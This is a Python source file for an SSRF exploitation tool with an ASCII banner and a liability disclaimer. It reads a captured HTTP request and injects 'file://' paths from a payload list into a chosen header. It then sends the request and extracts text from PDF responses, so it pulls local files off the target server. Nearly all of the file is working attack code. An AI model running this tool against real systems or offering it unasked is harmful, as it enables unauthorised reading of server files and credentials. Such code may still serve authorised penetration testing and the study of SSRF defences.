import argparse 
from termcolor import colored
import os 
import requests
import threading 
import time 
import random
import io
from PyPDF2 import PdfReader

results={}

def printBanner() :
    os.system('cls')
    print(colored(r"""
:'######:::'######::'########::'########:'########::'#######:::'#######::'##:::::::
'##... ##:'##... ##: ##.... ##: ##.....::... ##..::'##.... ##:'##.... ##: ##:::::::
 ##:::..:: ##:::..:: ##:::: ##: ##:::::::::: ##:::: ##:::: ##: ##:::: ##: ##:::::::
. ######::. ######:: ########:: ######:::::: ##:::: ##:::: ##: ##:::: ##: ##:::::::
:..... ##::..... ##: ##.. ##::: ##...::::::: ##:::: ##:::: ##: ##:::: ##: ##:::::::
'##::: ##:'##::: ##: ##::. ##:: ##:::::::::: ##:::: ##:::: ##: ##:::: ##: ##:::::::
. ######::. ######:: ##:::. ##: ##:::::::::: ##::::. #######::. #######:: ########:
:......::::......:::..:::::..::..:::::::::::..::::::.......::::.......:::........::
""","red"))
    print("-------------------------------By G12-----------------------------------------")
    print(colored("[WRN] Use with caution . You are responsible for your action","green"))
    print(colored("[WRN] Developers assume no liability and are not responsible for any misuse or damage.","green"))
    print("-------------------------------------------------------------------------------")







def  getRequest(filePath) :
     
    exists = os.path.exists(filePath)
    if exists == True : 
       file = open(filePath,'rt',encoding='utf-8')
       dataLines = file.readlines()
       #extracting data
       method,path,version=dataLines[0].split(" ")
       host,port=dataLines[1].split(" ")[1].split(":")
       
       url = "http://" + " ".join(map(lambda x : x.rstrip("\n "),[host,":",port,path])).replace(" ", "")
       header={}
       for i in range(2,len(dataLines)-1) : 
           header_parten = list(map(lambda x : x.rstrip("\n "),dataLines[i].split(": ")))
           header[header_parten[0]] = header_parten[1]

       return {'url':url,'method':method,'header':header}
    else : 
        print(colored("{file} NOT FOUND !!".format(file = filePath),'light_red'))

def getreadfilePayload() :
     #read filepayload 
    filepath=[]
    try : 
        with open('data/Filepayload.txt','rt') as file : 
              for line in file:
                data=(line.strip()) 
                filepath.append(data)
              return filepath     
    except FileNotFoundError:
        print("Không tìm thấy tệp tin.")
    except PermissionError:
        print("Không có quyền truy cập vào tệp tin.")
    except Exception as e:
        print("Đã xảy ra lỗi:", e) 

def doRequest_readfile(requester,parameter,path) :
    url,method,header=requester.values()
    if(method == 'GET') :
      print(colored('[TESTING]\t\t','yellow') + path)
      header[parameter] = "file://" + path

      response =requests.get(url,headers=header)
    if response.status_code == 200:
        buffer = response.content
        text=""
        #convert  to create a file-like object from your bytes buffer 
        with io.BytesIO(buffer) as f:
              reader = PdfReader(f)
              for page in reader.pages:
                  text+= page.extract_text()
            #   print(text)
            #   print("----------------------------------------")
              global results
              results[path]=text
        
def attack_readfile() :
        #getreadfilepayload
        filepathList=getreadfilePayload()
        
        #initial empty thread list
        threads =[]
        for path in filepathList : 
            thread = threading.Thread(target=doRequest_readfile,args=(requester,parameter,path))
            threads.append(thread)
            
        

        for thread in threads :
            thread.start()
            thread.join()

        # print(threads)
       
        for key in results.keys() :
          print("\n"+colored("Results for {path}".format(path=key),'yellow')+"\n")
          print(results[key])
        print(colored("Found {number_result} from payload".format(number_result=len(results)),"green"))  


def generate_ip(ip) : 
   print(ip)


if __name__ == "__main__" : 
    printBanner()
    parser = argparse.ArgumentParser(description='Tool exploit SSRF',usage="ssrftool.py [-h]  [-r request.txt]  [-p PARAM]  [-m MODULE]") 
    parser.add_argument('--p' , metavar="PARAM", dest="param", help="Insert payloaf in param position",required=True)
    parser.add_argument('--m' , metavar="MODULE",dest="module" ,help="SSRF Modules to enable",required=True)
    parser.add_argument('--r' , metavar="REQFILE",dest="rqfile", help="SSRF Request File",required=True)
    #paser argument
    args = parser.parse_args()
    requester=getRequest(args.rqfile)
    module = list(map((lambda x : x.lower()),args.module.split(',')))
    parameter = args.param.lower().capitalize()

    #main thread 
     

    
    if(len(module) == 1 and module[0] == 'readfile') : 
         print("THE MODULE BEING USED IS " + colored(" READFILE",'green'))
         attack_readfile()
        
    else :
       print("Something went wrong " + colored("TRY AGAIN !!",'light_red'))